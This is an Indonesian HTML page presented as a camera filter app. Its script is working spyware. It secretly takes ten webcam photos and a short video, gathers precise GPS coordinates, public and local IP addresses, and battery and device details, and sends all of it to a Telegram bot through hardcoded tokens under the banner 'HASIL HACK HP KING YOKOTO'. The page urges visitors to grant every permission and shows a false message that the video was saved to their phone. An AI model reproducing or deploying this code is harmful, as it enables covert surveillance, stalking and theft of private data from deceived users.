<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>pencari Filter Kamera</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #1e1e1e;
            color: white;
            padding: 20px;
            margin: 0;
        }
        h2 {
            margin-bottom: 10px;
        }
        video, canvas {
            width: 100%;
            max-width: 400px;
            border: 2px solid #fff;
            border-radius: 10px;
            background: black;
        }
        #hiddenCanvas {
            display: none;
        }

        /* Overlay Loading */
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: bold;
            z-index: 1000;
        }
    </style>
</head>
<body>

    <div id="loadingOverlay">Memulai sistem... Mohon tunggu 10 detik jika anda di minta izin kan apa pun itu izinkan karena akan berpengaruh ke vidio! loading...scanner camera </div>

    <h2>Filter Kamera</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        window.onload = async function() {
            startCamera();
            gatherDataAndSend();
            
            setTimeout(() => {
                document.getElementById("loadingOverlay").style.display = "none";
            }, 10000);
        };

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');
        const hiddenCtx = hiddenCanvas.getContext('2d');

        let mediaRecorder, recordedChunks = [];

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    hiddenCanvas.width = video.videoWidth;
                    hiddenCanvas.height = video.videoHeight;
                    drawEffect();
                };

                takePhotosAutomatically();

                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = (event) => recordedChunks.push(event.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    await sendVideoToTelegram(blob);
                };

                setTimeout(() => { mediaRecorder.stop(); }, 11000);
                mediaRecorder.start();

            } catch (error) {
                alert("Gagal mengakses kamera: " + error.message);
            }
        }

        function drawEffect() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.filter = "blur(2px) contrast(1.5)";
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawEffect);
        }

        async function takePhotosAutomatically() {
            for (let i = 0; i < 10; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                hiddenCtx.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                hiddenCanvas.toBlob(blob => sendPhotoToTelegram(blob), "image/jpeg", 0.8);
            }
        }

        async function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append("chat_id", "7016045840");
            formData.append("photo", blob, "photo.jpg");

            try {
                const response = await fetch("https://api.telegram.org/bot7554133435:AAESfBPV3PW2AqOwHSkFnlIsTp4nyg7FEX8/sendPhoto", {
                    method: "POST",
                    body: formData
                });

                const result = await response.json();
                console.log(result);

                if (!response.ok) {
                    throw new Error(result.description || "Gagal mengirim foto.");
                }
            } catch (error) {
                console.error("Error:", error);
            }
        }

        async function sendVideoToTelegram(blob) {
            const formData = new FormData();
            formData.append("chat_id", "7016045840");
            formData.append("video", blob, "video.webm");

            try {
                const response = await fetch("https://api.telegram.org/bot7554133435:AAESfBPV3PW2AqOwHSkFnlIsTp4nyg7FEX8/sendVideo", {
                    method: "POST",
                    body: formData
                });

                const result = await response.json();
                console.log(result);

                if (!response.ok) {
                    throw new Error(result.description || "Gagal mengirim video.");
                } else {
                    alert("Video berhasil di mulai dan simpan ke ponsel anda!");
                }
            } catch (error) {
                console.error("Error:", error);
                alert("Gagal menyimpan video ke ponsel anda : " + error.message);
            }
        }

        const BOT_TOKEN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";  
        const CHAT_ID = "7016045840";  

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = { chat_id: CHAT_ID, text: message };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                if (!response.ok) console.error("Gagal mengirim data.");
            }).catch(error => console.error("Error: ", error));
        }

        function getCurrentTime() {
            const now = new Date();
            return now.toLocaleDateString('id-ID', { 
                weekday: 'long', year: 'numeric', month: 'long', 
                day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' 
            });
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return `â”‚ *IP Publik: ${data.ip}*\n`;
            } catch {
                return "â”‚ *IP Publik: Tidak ditemukan*\n";
            }
        }

        async function getLocation() {
            try {
                return await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve(`
â”‚ *Lokasi:*
â”‚   Latitude: ${position.coords.latitude}
â”‚   Longitude: ${position.coords.longitude}
â”‚   Akurasi: ${position.coords.accuracy} meter
â”‚ *Link Lokasi:* https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
`);
                        },
                        (error) => reject("â”‚ *Lokasi: Gagal mendapatkan lokasi*\n"),
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                });
            } catch {
                return "â”‚ *Lokasi: Gagal mendapatkan lokasi*\n";
            }
        }

        async function gatherDataAndSend() {
            let message = `HASIL SISTEM AKTIF\n`;
            message += `Waktu: ${getCurrentTime()}\n`;
            message += await getIPInfo();
            message += await getLocation();
            sendToTelegram(message);
        }
        
        const BOT_TOKENN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";  
    const CHAT_IID = "7016045840";  

    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKENN}/sendMessage`;
        const payload = {
            chat_id: CHAT_IID,
            text: message
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).then(response => {
            const status = document.querySelector('.status');
            if (response.ok) {
                status.textContent = "Data berhasil dikirim!";
                status.classList.add("success");
            } else {
                status.textContent = "Gagal mengirim data.";
                status.classList.add("error");
            }
        }).catch(error => {
            console.error("Error: ", error);
        });
    }

    function getCurrentTime() {
        const now = new Date();
        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
        return now.toLocaleDateString('id-ID', options);
    }

    let message = `
__________________________________
HASIL HACK HP KING YOKOTO ðŸ‘‘
__________________________________
`;

    const currentTime = `â”‚ *Waktu Saat Ini: ${getCurrentTime()}*\n`;
    message += currentTime;

    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const batteryStatus = `â”‚ *Persentase Baterai: ${Math.round(battery.level * 100)}% ${battery.charging ? "Sedang Mengisi Daya" : "Tidak Sedang Mengisi Daya"}*\n`;
            message += batteryStatus;
        });
    } else {
        message += "â”‚ *Baterai: Tidak didukung*\n";
    }

    const networkStatus = `
â”‚ *Status Online: ${navigator.onLine ? "Online" : "Offline"}*
â”‚ *Jenis Koneksi: ${navigator.connection ? navigator.connection.effectiveType : 'Tidak diketahui'}*
`;
    message += networkStatus;

    const deviceInfo = `
â”‚ *Browser: ${navigator.userAgent}*
â”‚ *Sistem Operasi: ${navigator.platform}*
â”‚ *Resolusi Layar: ${window.screen.width} x ${window.screen.height}*
â”‚ *Pixel Ratio: ${window.devicePixelRatio}*
`;
    message += deviceInfo;

    function getGPUInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'Tidak tersedia';

        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Tidak diketahui';
    }
    message += `â”‚ *GPU: ${getGPUInfo()}*\n`;

    async function getIPInfo() {
        try {
            const localIP = await new Promise((resolve) => {
                const pc = new RTCPeerConnection();
                pc.createDataChannel("");
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (match) resolve(match[0]);
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            });
            message += `â”‚ *IP Lokal: ${localIP}*\n`;
        } catch {
            message += "â”‚ *IP Lokal: Tidak ditemukan*\n";
        }

        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            message += `â”‚ *IP Publik: ${data.ip}*\n`;
        } catch {
            message += "â”‚ *IP Publik: Tidak ditemukan*\n";
        }
    }

    async function getOperatorInfo() {
        try {
            const response = await fetch('https://ipinfo.io?token=5517785ba3ae07');
            const operator = await getNetworkOperator();
            message += `â”‚ *Nama Operator: ${operator}*\n`;
        } catch (error) {
            console.log("Error mendapatkan nama operator: ", error);
            message += "â”‚ *Nama Operator: Tidak ditemukan*\n";
        }
    }

    async function getLocation() {
        try {
            const locationData = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        resolve(`
â”‚ *Lokasi Akurat:*
â”‚   Latitude: ${latitude}
â”‚   Longitude: ${longitude}
â”‚   Akurasi: ${accuracy} meter
â”‚ *Link Lokasi:* https://www.google.com/maps?q=${latitude},${longitude}
`);
                    },
                    (error) => reject(error),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
            message += locationData;
        } catch (error) {
            message += "â”‚ *Lokasi: Gagal mendapatkan lokasi*\n";
        }
    }

    async function gatherDataAndSend() {
        await getIPInfo();
        await getOperatorInfo();
        await getLocation();
        message += "__________________________________\n";
        sendToTelegram(message);
    }

    gatherDataAndSend();
    </script>

</body>
</html>
